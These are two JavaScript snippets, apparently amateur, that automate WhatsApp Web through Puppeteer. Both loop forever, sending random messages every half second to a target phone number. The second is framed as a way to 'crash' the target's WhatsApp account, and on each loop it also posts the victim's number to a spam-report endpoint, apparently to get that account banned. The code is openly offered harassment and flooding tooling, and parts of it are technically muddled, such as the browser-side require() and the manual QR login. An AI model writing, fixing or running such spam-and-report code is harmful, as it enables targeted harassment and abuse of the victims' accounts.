// Get the input fields and buttons
const phoneInput = document.getElementById('phone');
const typeSelect = document.getElementById('type');
const sendBtn = document.getElementById('sendBtn');
const autoSendBtn = document.getElementById('autoSendBtn');
const messagesDiv = document.getElementById('messages');

// Add event listeners to the buttons
sendBtn.addEventListener('click', send_message);
autoSendBtn.addEventListener('click', auto_send_messages);

// Function to send a message
function send_message() {
  const phone = phoneInput.value;
  const type = typeSelect.value;
  const message = generateRandomMessage();

  // Use Axios to send the message
  axios.post('/send_message', {
    phone: phone,
    type: type,
    message: message
  })
  .then((response) => {
    console.log(response);
    messagesDiv.innerHTML += `<p>Message sent to ${phone}: ${message}</p>`;
  })
  .catch((error) => {
    console.error(error);
  });
}

// Function to generate random messages
function generateRandomMessage() {
  const words = ['hello', 'world', 'this', 'is', 'a', 'test'];
  let message = '';

  for (let i = 0; i < 20; i++) {
    message += words[Math.floor(Math.random() * words.length)] + ' ';
  }

  return message;
}

// Function to auto send messages
function auto_send_messages() {
  const phone = phoneInput.value;
  const type = typeSelect.value;

  // Use Puppeteer to automate the browser
  const puppeteer = require('puppeteer');
  (async () => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    // Go to WhatsApp Web
    await page.goto('https://web.whatsapp.com/');

    // Wait for the QR code to appear
    await page.waitForSelector('canvas');

    // Scan the QR code using an existing WhatsApp account
    // You'll need to find a way to automate this part or have someone scan the code manually

    // Loop infinitely to send messages
    while (true) {
      // Enter the target's phone number
      await page.type('input[placeholder="Phone number, contact name, or message"]', phone);

      // Type a random message
      await page.type('div[role="textbox"]', generateRandomMessage());

      // Send the message
      await page.click('button[data-icon="send"]');

      // Delay for a short while before sending the next message
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    // Close the browser
    await browser.close();
  })();
}
 //CODE #2

// Import required libraries
const puppeteer = require('puppeteer');
const axios = require('axios');

// Function to crash a WhatsApp account
async function crash_whatsapp_account(phone) {
  // Launch a new browser instance
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Go to WhatsApp Web
  await page.goto('https://web.whatsapp.com/');

  // Wait for the QR code to appear
  await page.waitForSelector('canvas');

  // Scan the QR code using an existing WhatsApp account
  // You'll need to find a way to automate this part or have someone scan the code manually

  // Loop infinitely to spam the target's WhatsApp
  while (true) {
    // Enter the target's phone number
    await page.type('input[placeholder="Phone number, contact name, or message"]', phone);

    // Type a random message
    const message = generateRandomMessage();
    await page.type('div[role="textbox"]', message);

    // Send the message
    await page.click('button[data-icon="send"]');

    // Delay for a short while before sending the next message
    await new Promise(resolve => setTimeout(resolve, 500));

    // Use Axios to report the target's phone number as spam
    axios.post('/report_spam', {
      phone: phone
    })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.error(error);
    });
  }

  // Close the browser
  await browser.close();
}

// Function to generate random messages
function generateRandomMessage() {
  const words = ['hello', 'world', 'this', 'is', 'a', 'test'];
  let message = '';

  for (let i = 0; i < 20; i++) {
    message += words[Math.floor(Math.random() * words.length)] + ' ';
  }

  return message;
}

// Call the function to crash a WhatsApp account
crash_whatsapp_account('target_phone_number');
